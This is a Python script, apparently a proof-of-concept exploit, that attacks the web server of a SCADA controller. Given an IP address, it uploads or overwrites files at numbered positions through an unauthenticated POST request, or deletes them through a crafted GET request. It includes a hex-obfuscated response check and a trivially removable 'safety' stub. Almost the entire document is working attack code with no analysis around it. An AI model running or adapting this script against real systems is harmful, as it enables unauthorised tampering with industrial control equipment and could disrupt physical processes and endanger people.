#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# scada controller fileops script
#

import time,sys
import requests
import datetime
import showtime

def bann():
    print('''
----------------------------------------------------------
          ) ) )                     ) ) )
        ( ( (                      ( ( (
      ) ) )                       ) ) )
   (~~~~~~~~~)                 (~~~~~~~~~)
    |       |                   |       |
    |       |                   |       |
    I      _._                  I       _._
    I    /'   `\\                I     /'   `\\
    I   |   M   |               I    |   Q   |
    f   |   |~~~~~~~~~~~~~~|    f    |    |~~~~~~~~~~~~~~|
  .'    |   ||~~~~~~~~|    |  .'     |    | |~~~~~~~~|   |
/'______|___||__###___|____|/'_______|____|_|__###___|___|

----------------------------------------------------------
        ''')

def safe(*trigger, ):
    return True # |-| Safety Switch

def choice(n):
    try:
        if n == 1:
            overwrite(controllerip = sys.argv[1], filepos = int(sys.argv[3], base = 10))
        elif n == 2:
            delete(controllerip = sys.argv[1], filepos = int(sys.argv[2], base = 10))
        else:
           print('Usage (Upload/Overwrite): ./scr.py [IP] [Local file] [File position number]')
           print('Usage (Delete): ./scr.py [IP] [File position number]')
           raise SystemExit('-')
    except Exception as tip:
        raise SystemExit(tip)

def jump():
    choice(1) if len(sys.argv) == 4 else next
    choice(2) if len(sys.argv) == 3 else next

def overwrite(controllerip, filepos):
    print('Starting script at', start)
    localfile = sys.argv[2]

    with open(localfile, 'rb') as opener:
        scadaurl  = 'http://'
        scadaurl += controllerip
        scadaurl += '/d.eks?P'
        scadaurl += str(filepos)
        scadaurl += ',63,'
        scadaurl += opener.name
        scadaurl += '~'
        scadaurl += str(int(time.time()))

        see = requests.post(scadaurl, files = {'upload' : opener})

        if '100' in see.text:
            print('File uploaded in {} directory at position {}.'.format('l', filepos))
            print('URL: http://' +controllerip+ '/l/' +localfile)
        else:
            print("- controller webserver error.")
    exit()

def delete(controllerip, filepos):
    print('Starting script at', start)
    exit(66) if isinstance(filepos, str) else next

    scadaurl  = 'http://'
    scadaurl += controllerip
    scadaurl += '/aW12GbL_Dat_P'
    scadaurl += str(filepos)
    scadaurl += ',0=1~'
    scadaurl += str(int(time.time()))

    see = requests.get(scadaurl)

    check  = '\x72\x57'  #|
    check += '\x31\x32'  #|
    check += '\x49\x63'  #|
    check += '\x4c\x5f'  #|
    check += '\x44\x61'  #|
    check += '\x74\x5f'  #|
    check += '\x4e'# o'  #|
    check += str(filepos)#|
    check += '\x2c\x30'  #|
    check += '\x09\x52'  #|
    
    if check in see.text:
        print('File at position {} deleted.'.format(filepos))
    else:
    	print('- controller webserver error.')
    exit()

def main():
    if safe(True):
        print('Careful...\nSafety: ON')
        exit(24)
    else:
        print('Safety: OFF', end = '')
    global start
    start = datetime.datetime.now()
    start = start.strftime('%d.%m.%Y %H:%M:%S')
    bann(), jump(), choice(1959)

if __name__ == "__main__":
    main()
